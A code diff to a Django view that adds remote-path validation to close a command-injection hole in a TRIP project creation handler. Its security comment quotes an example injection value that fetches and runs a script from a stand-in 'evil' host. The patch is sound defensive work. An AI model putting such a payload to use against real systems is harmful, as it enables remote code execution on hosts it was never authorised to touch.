@@ -16,6 +16,7 @@ from django.utils import timezone
 from django.utils.safestring import mark_safe
 
 from ...models import Project, RemoteCredential
+from ...ssh_safety import validate_remote_path
 
 logger = logging.getLogger(__name__)
 
@@ -33,6 +34,29 @@ def create_trip_project(request, name, description, remote_credential_id, remote
     """
     if not all([name, remote_credential_id, remote_path]):
         messages.error(request, "All fields are required for TRIP projects")
+        return redirect("project_create")
+
+    # SECURITY: remote_path is interpolated into a command that runs on the
+    # remote host — `test -d "{remote_path}"` in _test_trip_connection below.
+    # Double quotes do NOT stop command substitution, so `/tmp/$(curl
+    # http://evil|sh)` executes there. Reject shell metacharacters BEFORE any
+    # of that. Fail loud.
+    #
+    # This is the same sink, with the same wording, that create_remote.py
+    # already guards — TRIP was simply missed when ssh_safety was rolled out
+    # across the other 8 sinks. The blast radius is narrower than it looks
+    # (the command lands on the remote host the caller reached with their OWN
+    # RemoteCredential, so it is neither our host nor cross-tenant, and the
+    # residual is closer to self-inflicted DoS), which is exactly why it
+    # survived: it read as low severity and stayed open while the class it
+    # belongs to was declared closed. A partially-closed class invites
+    # "we fixed that already", so the last member is worth the three lines.
+    from django.core.exceptions import ValidationError
+
+    try:
+        validate_remote_path(remote_path)
+    except ValidationError as exc:
+        messages.error(request, "; ".join(exc.messages))
         return redirect("project_create")
 
     # Get remote credential
